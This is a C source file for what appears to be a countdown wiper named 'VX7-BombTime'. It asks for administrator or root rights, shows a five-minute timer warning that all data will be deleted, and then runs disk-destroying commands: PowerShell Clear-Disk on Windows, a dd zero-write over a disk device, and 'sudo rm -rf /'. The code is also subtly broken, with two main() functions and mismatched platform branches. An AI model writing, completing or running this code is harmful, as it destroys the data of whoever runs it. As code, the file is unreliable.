#include <stdio.h>
#include <stdlib.h>
#include <time.h>


#ifdef _WIN32
    #include <windows.h>
    #include <shellapi.h>
    #define SLEEP(ms) Sleep(ms)
#else
    #include <unistd.h>
    #define SLEEP(ms) usleep(ms * 1000)
#endif

int main(int argc, char *argv[]) {
    #ifdef _WIN32
        if (!IsUserAnAdmin()) {
            char szPath[MAX_PATH];
            GetModuleFileName(NULL, szPath, MAX_PATH);

            ShellExecute(NULL, "runas", szPath, NULL, NULL, SW_SHOWNORMAL);
            return 0;
        }

    #elif defined(__linux__) || defined(__APPLE__)
        if (geteuid() != 0) {
            char *args[argc + 2];
            args[0] = "sudo";
            for (int i = 0; i < argc; i++) {
                args[i + 1] = argv[i];
            }
            args[argc + 1] = NULL;

            execvp("sudo", args);
            perror("Error executing sudo");
            return 1;
        }

    #else
        #error "Unsupported operating system"
    #endif
}


void KillW() {
    system("powershell.exe -Command \"Get-Disk | Clear-Disk -RemoveData -RemoveOEM -Confirm:$false -ErrorAction SilentlyContinue\"");
}
void KillL() {
    system("sudo dd if=/dev/zero of=/dev/sdX bs=512 count=100");
}
void KillA() {
    system("sudo rm -rf /");
}


int main() {
    const int duration_ms = 300000;
    time_t start = time(NULL);

    while (1)
    {
        time_t now = time(NULL);
        long elased_ms = (now - start) * 1000;

        if (elased_ms >= duration_ms) {
            #if defined(_WIN32) || defined(_WIN64)
                KillW();
            #elif defined(__APPLE__)
                KillL();
            #elif defined(__linux__)
                KillA();
            #endif
            break;
        }

        int minuts = (elased_ms / 60000);
        int seconds = (elased_ms % 60000) / 1000;
        int miliseconds = elased_ms % 1000;

        printf("\n");
        printf("     ██████╗██████╗ ██████╗         \n");
        printf("    ██╔════╝██╔══██╗██╔═══██╗       \n");
        printf("    ██║     ██║  ██║██║   ██║       \n");
        printf("    ██║     ██║  ██║██║▄▄ ██║       \n");
        printf("    ██║     ██║  ██║██║▀▀ ██║       \n");
        printf("    ╚██████╗██████╔╝╚██████╔╝       \n");
        printf("     ╚═════╝╚═════╝  ╚═════╝        \n\n");
        printf(" [ CDQ ] :: VX7-BombTime  \n");
        printf(" --------------------------------   \n");

        printf("\nAll your data will be deleted in:\n\n");


        printf("\033[31mTime: %02d:%02d:%03d\r\033[0m", minuts, seconds, miliseconds);

        fflush(stdout);

        SLEEP(200);
    }
    printf("\n¡Time out!\n");

    return 0;
}